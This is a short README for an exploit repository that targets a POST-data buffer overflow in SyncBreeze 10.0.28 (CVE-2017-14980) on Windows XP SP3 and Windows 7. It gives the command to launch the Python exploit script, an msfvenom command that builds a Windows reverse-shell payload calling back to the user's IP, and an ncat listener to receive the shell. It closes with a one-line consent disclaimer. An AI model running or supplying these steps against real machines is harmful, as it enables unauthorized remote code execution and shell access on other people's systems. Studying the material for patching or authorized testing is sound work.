# SyncBreeze 10.0.28 Buffer OverFlow for Remote Code Execution [CVE-2017-14980]
POST data buffer overflow, the CVE score is 7.5 but the impact is critical
## How it works?
That easy BoF, rewritten by me, will overwrite the buffer and execute the shellcode
## Vuln machines:
WindowsXP SP3 and Windows7
## Launch:
````~$ python3 SyncBreeze.py <host> <port>````
## Change the ShellCode with your own!!
````~$ sudo ./msfvenom windows/shell_reverse_tcp LHOST=<your ip> LPORT=4444````
## Listen with netcat:
````~$ ncat -lvp 4444````
### Don't pwn any machine without consent!!
